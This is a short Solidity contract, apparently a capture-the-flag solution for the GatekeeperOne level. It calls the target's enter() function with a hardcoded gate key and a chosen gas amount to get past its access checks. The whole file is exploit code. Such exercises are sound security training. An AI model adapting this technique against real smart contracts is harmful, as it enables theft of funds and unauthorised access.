pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract AttackerContractV3 {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function getGateKey() internal pure returns (bytes8) {
        return bytes8(uint64(0x0000133700002266)); // 0x0000133700002266 as uint64
    }

    function attack() external {
        GatekeeperOne(instance).enter{gas: 8191 * 2}(getGateKey());
    }
}
